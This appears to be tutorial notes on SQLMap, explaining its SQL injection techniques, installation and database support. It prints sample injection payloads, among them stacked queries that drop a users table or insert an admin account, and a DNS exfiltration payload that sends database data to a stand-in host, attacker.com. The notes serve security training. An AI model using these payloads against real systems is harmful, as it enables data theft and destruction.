## SQLMap Overview

SQLMap is the most comprehensive automated SQL injection tool available, written in Python and actively maintained since 2006. It covers the full attack chain from detection through exploitation, supporting more database engines and injection techniques than any other tool in the same category.

***

## Installation

```bash
# Pre-installed on Kali/Pwnbox, or install via apt
sudo apt install sqlmap

# Manual install from source
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py
```

The `--depth 1` flag clones only the latest commit, keeping the download small while still pulling the most current version.

***

## Supported Injection Techniques (BEUSTQ)

SQLMap tests all six techniques by default. Understanding each helps you choose which to restrict or enable depending on the target's behaviour:

| Code | Technique | Speed | Use When |
|------|-----------|-------|---------|
| `B` | Boolean-based blind | Slow | Output invisible, page differs true/false |
| `E` | Error-based | Fast | DB errors visible in response |
| `U` | UNION query | Fastest | Query results rendered on page |
| `S` | Stacked queries | Variable | Non-query statements needed (INSERT/UPDATE) |
| `T` | Time-based blind | Slowest | No output visible, no page difference |
| `Q` | Inline queries | Variable | Rare, app written to support subquery output |

UNION-based is the fastest because it can retrieve an entire table in a single request. Time-based is the slowest because every TRUE response waits for a `SLEEP()` delay before proceeding.

***

## How Each Technique Works

### Boolean-based Blind (B)

```sql
AND 1=1   -- TRUE: page loads normally
AND 1=2   -- FALSE: page differs (missing content, different length)
```

SQLMap compares responses character by character to extract data one bit at a time. It is the most common technique encountered because virtually every web application renders output differently for true versus false conditions.

### Error-based (E)

```sql
AND GTID_SUBSET(@@version,0)
```

Forces the database to include query results inside error messages returned to the application. Retrieves data in chunks of roughly 200 bytes per request, making it significantly faster than blind techniques. Works only when raw database errors are exposed in the response.

### UNION Query-based (U)

```sql
UNION ALL SELECT 1,@@version,3
```

Appends a second SELECT whose results appear directly in the page output. The fastest technique by a large margin, capable of dumping an entire table in one request when the column count and types are known.

### Stacked Queries (S)

```sql
; DROP TABLE users
; INSERT INTO admins VALUES('hacker','password')
```

Terminates the original query and executes a new one. Supported natively by MSSQL and PostgreSQL but not MySQL by default. Required when exploitation needs non-SELECT statements like INSERT, UPDATE, or OS command execution via stored procedures.

### Time-based Blind (T)

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

Uses response delay as the signal. A 5-second delay means TRUE; normal response time means FALSE. Slowest technique but the fallback when Boolean-based blind is not applicable, such as when the injection is inside an INSERT or UPDATE statement that produces no visible page output regardless of the result.

### Inline Queries (Q)

```sql
SELECT (SELECT @@version) FROM table
```

Embeds a subquery inside the original query. Uncommon because it requires specific application code patterns that pass subquery results through to the response.

***

## Out-of-Band SQLi (DNS Exfiltration)

Out-of-band is not included in the default `BEUSTQ` technique string because it requires external infrastructure. SQLMap implements it through DNS exfiltration:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

The database attempts to resolve `10.3.22-MariaDB.attacker.com` as a UNC path. The attacker's DNS server logs the subdomain request, and the SQL response is extracted from the subdomain portion of the DNS query. This technique bypasses all in-band output restrictions and is used when every other method is either unsupported or too slow.

Requirements: control of a domain and a DNS server capable of logging all queries. SQLMap handles the payload construction; the attacker provides the domain.

***

## Database Support

SQLMap's breadth of DBMS support is what separates it from purpose-built tools like those targeting MySQL specifically. The full list covers over 30 databases including all major enterprise platforms: [hackertarget](https://hackertarget.com/sqlmap-tutorial/)

- Web application databases: MySQL, MariaDB, PostgreSQL, SQLite
- Enterprise: Oracle, MSSQL, IBM DB2, Sybase, SAP MaxDB
- Cloud/modern: Amazon Redshift, CockroachDB, TiDB, Vertica, Presto
- Legacy: Firebird, Informix, Microsoft Access, HSQLDB

DBMS fingerprinting happens automatically during the initial scan. Once identified, SQLMap switches to DBMS-specific payloads that are more reliable and produce cleaner output than generic techniques.
